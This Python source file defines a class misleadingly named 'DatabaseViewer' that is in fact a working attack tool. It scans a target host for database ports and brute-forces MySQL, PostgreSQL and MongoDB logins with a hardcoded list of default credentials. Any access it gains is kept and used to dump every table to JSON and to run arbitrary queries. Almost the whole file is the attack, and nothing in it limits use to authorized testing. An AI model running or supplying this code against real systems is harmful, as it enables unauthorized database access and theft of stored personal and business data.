import mysql.connector
import psycopg2
import pymongo
import sqlite3
import threading
import queue
import time
from typing import Dict, List, Any, Optional
import json
import os

class DatabaseViewer:
    """Advanced database viewer with automatic connection, bruteforce and dump capabilities"""
    
    def __init__(self):
        self.connections = {}
        self.attack_queue = queue.Queue()
        self.results_queue = queue.Queue()
        self.progress_callback = None
        
        # Common credentials for bruteforce
        self.common_creds = [
            ('root', ''),
            ('root', 'root'),
            ('root', 'password'),
            ('root', '123456'),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('user', 'user'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('sa', ''),
            ('postgres', 'postgres'),
            ('mysql', 'mysql'),
            ('oracle', 'oracle')
        ]
    
    def set_progress_callback(self, callback):
        """Set callback for progress updates"""
        self.progress_callback = callback
    
    def _update_progress(self, message):
        """Update progress through callback"""
        if self.progress_callback:
            self.progress_callback(message)
    
    def discover_databases(self, target_host: str, port_range: List[int] = None) -> Dict[str, Any]:
        """Discover database services on target host"""
        if not port_range:
            port_range = [3306, 5432, 27017, 1433, 1521, 6379]  # MySQL, PostgreSQL, MongoDB, MSSQL, Oracle, Redis
        
        results = {
            'discovered_services': [],
            'connection_attempts': [],
            'successful_connections': []
        }
        
        self._update_progress(f"🔍 Scanning {target_host} for database services...")
        
        for port in port_range:
            service_type = self._identify_service(port)
            self._update_progress(f"→ Checking {service_type} on port {port}")
            
            if self._check_port_open(target_host, port):
                results['discovered_services'].append({
                    'host': target_host,
                    'port': port,
                    'service': service_type,
                    'status': 'open'
                })
                
                # Attempt connection with common credentials
                connection_results = self._bruteforce_credentials(target_host, port, service_type)
                results['connection_attempts'].extend(connection_results['attempts'])
                results['successful_connections'].extend(connection_results['successful'])
        
        return results
    
    def _identify_service(self, port: int) -> str:
        """Identify database service by port"""
        port_services = {
            3306: 'MySQL',
            5432: 'PostgreSQL', 
            27017: 'MongoDB',
            1433: 'MSSQL',
            1521: 'Oracle',
            6379: 'Redis'
        }
        return port_services.get(port, 'Unknown')
    
    def _check_port_open(self, host: str, port: int) -> bool:
        """Check if port is open"""
        import socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _bruteforce_credentials(self, host: str, port: int, service_type: str) -> Dict[str, Any]:
        """Bruteforce common credentials"""
        results = {
            'attempts': [],
            'successful': []
        }
        
        self._update_progress(f"🔓 Bruteforcing {service_type} credentials on {host}:{port}")
        
        for username, password in self.common_creds:
            try:
                connection = None
                success = False
                
                if service_type == 'MySQL':
                    connection = mysql.connector.connect(
                        host=host, port=port, user=username, password=password, 
                        connection_timeout=3, autocommit=True
                    )
                    success = connection.is_connected()
                
                elif service_type == 'PostgreSQL':
                    connection = psycopg2.connect(
                        host=host, port=port, user=username, password=password,
                        database='postgres', connect_timeout=3
                    )
                    success = not connection.closed
                
                elif service_type == 'MongoDB':
                    from pymongo import MongoClient
                    connection = MongoClient(f'mongodb://{username}:{password}@{host}:{port}/', 
                                           serverSelectionTimeoutMS=3000)
                    connection.admin.command('ping')
                    success = True
                
                if success and connection:
                    self._update_progress(f"✅ Success! {username}:{password} on {service_type}")
                    results['successful'].append({
                        'host': host,
                        'port': port,
                        'service': service_type,
                        'username': username,
                        'password': password,
                        'connection': connection
                    })
                    self.connections[f"{host}:{port}"] = connection
                
                results['attempts'].append({
                    'credentials': f'{username}:{password}',
                    'success': success
                })
                
            except Exception as e:
                results['attempts'].append({
                    'credentials': f'{username}:{password}',
                    'success': False,
                    'error': str(e)
                })
                continue
        
        return results
    
    def dump_database(self, connection_key: str, output_path: str = './database_dumps/') -> Dict[str, Any]:
        """Dump database contents"""
        if connection_key not in self.connections:
            return {'success': False, 'error': 'Connection not found'}
        
        connection = self.connections[connection_key]
        host, port = connection_key.split(':')
        
        os.makedirs(output_path, exist_ok=True)
        dump_file = os.path.join(output_path, f"dump_{host}_{port}_{int(time.time())}.json")
        
        results = {
            'success': False,
            'dump_file': dump_file,
            'tables_dumped': [],
            'total_records': 0
        }
        
        try:
            self._update_progress(f"📁 Dumping database from {connection_key}")
            
            # MySQL dump
            if isinstance(connection, mysql.connector.connection.MySQLConnection):
                cursor = connection.cursor()
                
                # Get databases
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall() if db[0] not in ['information_schema', 'mysql', 'performance_schema', 'sys']]
                
                dump_data = {}
                for database in databases:
                    self._update_progress(f"→ Dumping database: {database}")
                    cursor.execute(f"USE {database}")
                    
                    # Get tables
                    cursor.execute("SHOW TABLES")
                    tables = [table[0] for table in cursor.fetchall()]
                    
                    dump_data[database] = {}
                    for table in tables:
                        self._update_progress(f"  → Dumping table: {table}")
                        cursor.execute(f"SELECT * FROM {table}")
                        rows = cursor.fetchall()
                        
                        # Get column names
                        cursor.execute(f"DESCRIBE {table}")
                        columns = [col[0] for col in cursor.fetchall()]
                        
                        dump_data[database][table] = {
                            'columns': columns,
                            'rows': [dict(zip(columns, row)) for row in rows]
                        }
                        
                        results['tables_dumped'].append(f"{database}.{table}")
                        results['total_records'] += len(rows)
                
                cursor.close()
            
            # PostgreSQL dump
            elif hasattr(connection, 'cursor'):
                cursor = connection.cursor()
                
                # Get tables
                cursor.execute("SELECT tablename FROM pg_tables WHERE schemaname = 'public'")
                tables = [table[0] for table in cursor.fetchall()]
                
                dump_data = {'public': {}}
                for table in tables:
                    self._update_progress(f"→ Dumping table: {table}")
                    cursor.execute(f"SELECT * FROM {table}")
                    rows = cursor.fetchall()
                    
                    # Get column names
                    cursor.execute(f"SELECT column_name FROM information_schema.columns WHERE table_name = '{table}'")
                    columns = [col[0] for col in cursor.fetchall()]
                    
                    dump_data['public'][table] = {
                        'columns': columns,
                        'rows': [dict(zip(columns, row)) for row in rows]
                    }
                    
                    results['tables_dumped'].append(table)
                    results['total_records'] += len(rows)
                
                cursor.close()
            
            # Save dump to file
            with open(dump_file, 'w') as f:
                json.dump(dump_data, f, indent=2, default=str)
            
            results['success'] = True
            self._update_progress(f"✅ Database dump completed: {dump_file}")
            
        except Exception as e:
            results['error'] = str(e)
            self._update_progress(f"❌ Dump failed: {str(e)}")
        
        return results
    
    def execute_query(self, connection_key: str, query: str) -> Dict[str, Any]:
        """Execute custom query on database"""
        if connection_key not in self.connections:
            return {'success': False, 'error': 'Connection not found'}
        
        connection = self.connections[connection_key]
        
        try:
            cursor = connection.cursor()
            cursor.execute(query)
            
            if query.strip().upper().startswith('SELECT'):
                results = cursor.fetchall()
                columns = [desc[0] for desc in cursor.description]
                
                return {
                    'success': True,
                    'columns': columns,
                    'rows': [dict(zip(columns, row)) for row in results],
                    'row_count': len(results)
                }
            else:
                connection.commit()
                return {
                    'success': True,
                    'message': f'Query executed successfully. Affected rows: {cursor.rowcount}'
                }
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            cursor.close()
    
    def get_database_info(self, connection_key: str) -> Dict[str, Any]:
        """Get detailed database information"""
        if connection_key not in self.connections:
            return {'success': False, 'error': 'Connection not found'}
        
        connection = self.connections[connection_key]
        
        try:
            cursor = connection.cursor()
            info = {'success': True, 'databases': {}}
            
            # MySQL info
            if isinstance(connection, mysql.connector.connection.MySQLConnection):
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall()]
                
                for database in databases:
                    cursor.execute(f"USE {database}")
                    cursor.execute("SHOW TABLES")
                    tables = [table[0] for table in cursor.fetchall()]
                    
                    table_info = {}
                    for table in tables:
                        cursor.execute(f"SELECT COUNT(*) FROM {table}")
                        row_count = cursor.fetchone()[0]
                        
                        cursor.execute(f"DESCRIBE {table}")
                        columns = cursor.fetchall()
                        
                        table_info[table] = {
                            'row_count': row_count,
                            'columns': [{'name': col[0], 'type': col[1], 'key': col[3]} for col in columns]
                        }
                    
                    info['databases'][database] = table_info
            
            cursor.close()
            return info
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def close_connections(self):
        """Close all database connections"""
        for key, connection in self.connections.items():
            try:
                connection.close()
            except:
                pass
        self.connections.clear()